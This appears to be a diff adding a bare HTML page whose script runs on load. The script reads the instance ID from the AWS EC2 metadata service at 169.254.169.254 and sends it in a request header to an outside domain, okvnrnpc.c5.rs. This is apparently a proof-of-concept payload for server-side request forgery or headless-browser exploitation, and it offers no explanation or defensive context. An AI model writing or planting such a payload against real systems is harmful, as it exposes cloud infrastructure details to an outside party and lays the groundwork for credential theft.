@@ -1,0 +1,64 @@
+<html>
+
+<body>
+    <script>
+        // Function to fetch AWS EC2 instance metadata
+        function fetchAWSMetadata(callback) {
+            const metadataURL = 'http://169.254.169.254/latest/meta-data/instance-id';
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', metadataURL, true);
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        // Successfully retrieved metadata
+                        const instanceId = xhr.responseText;
+                        callback(null, instanceId);
+                    } else {
+                        // Failed to retrieve metadata
+                        callback(new Error('Failed to fetch AWS metadata'), null);
+                    }
+                }
+            };
+
+            xhr.send();
+        }
+
+        // Function to send a GET request to a URL endpoint with metadata
+        function sendGetRequestWithMetadata(url, metadata) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+
+            // Optional: Add metadata to headers or query parameters if needed
+            xhr.setRequestHeader('X-Instance-Id', metadata);
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        console.log('Response from server:', xhr.responseText);
+                    } else {
+                        console.error('Failed to fetch data from the server');
+                    }
+                }
+            };
+
+            xhr.send();
+        }
+
+        // Usage example
+        const targetURL = 'https://okvnrnpc.c5.rs';
+
+        fetchAWSMetadata((err, metadata) => {
+            if (err) {
+                console.error(err.message);
+            } else {
+                console.log('AWS Metadata:', metadata);
+                sendGetRequestWithMetadata(targetURL, metadata);
+            }
+        });
+
+    </script>
+</body>
+
+</html>
